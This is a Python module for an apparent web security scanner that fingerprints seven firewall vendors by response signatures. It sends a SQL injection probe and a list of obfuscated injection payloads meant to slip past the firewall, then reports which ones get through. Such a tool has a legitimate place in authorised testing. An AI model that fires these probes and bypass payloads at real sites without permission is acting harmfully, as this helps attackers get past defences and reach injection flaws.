from modules.base import BaseModule


class WafModule(BaseModule):
    NAME = "waf"
    DESCRIPTION = "WAF detection and bypass evasion techniques"

    WAF_SIGNATURES = {
        "Cloudflare":   ["cloudflare", "cf-ray", "__cfduid"],
        "AWS WAF":      ["awswaf", "x-amzn-requestid"],
        "ModSecurity":  ["mod_security", "modsecurity"],
        "Akamai":       ["akamai"],
        "Imperva":      ["incap_ses", "_incap_"],
        "Sucuri":       ["sucuri", "x-sucuri-id"],
        "F5 BIG-IP":    ["bigip", "f5"],
    }

    EVASION_PAYLOADS = [
        "1 aNd 1=1",
        "1/**/AND/**/1=1",
        "1 /*!AND*/ 1=1",
        "1%2520AND%25201=1",
        "1%09AND%091=1",
        "1%0aAND%0a1=1",
        "1 && 1=1",
        "1 || 1=1",
    ]

    def run(self):
        self.log.info("[waf] Detecting WAF presence and testing evasions")
        self._detect_waf()
        self._test_evasion()

    def _detect_waf(self):
        resp = self.get(self.target + "/?id=1' OR '1'='1")
        if not resp:
            return
        headers_str = str(resp.headers).lower()
        body_str = resp.text.lower()

        for waf_name, sigs in self.WAF_SIGNATURES.items():
            if any(sig in headers_str or sig in body_str for sig in sigs):
                self.add_finding(
                    severity="INFO",
                    title=f"WAF detected: {waf_name}",
                    url=self.target,
                    detail=f"Signature matched for {waf_name}.",
                    remediation="Note for manual evasion testing.",
                )
                self.results.meta["waf"] = waf_name
                return

        if resp.status_code in (403, 406, 429, 501):
            self.add_finding(
                severity="INFO",
                title="WAF or security filter detected (unknown vendor)",
                url=self.target,
                detail=f"Probe returned HTTP {resp.status_code}.",
            )
        else:
            self.add_finding(
                severity="INFO",
                title="No WAF detected",
                url=self.target,
                detail="Malformed SQL probe was not blocked.",
            )

    def _test_evasion(self):
        for payload in self.EVASION_PAYLOADS:
            resp = self.get(self.target + f"/?id={payload}")
            if resp and resp.status_code == 200:
                self.add_finding(
                    severity="MEDIUM",
                    title="WAF evasion successful",
                    url=self.target,
                    detail=f"Payload not blocked: '{payload}'.",
                    payload=payload,
                    remediation="Tune WAF rules to catch obfuscated injection patterns.",
                )
                return
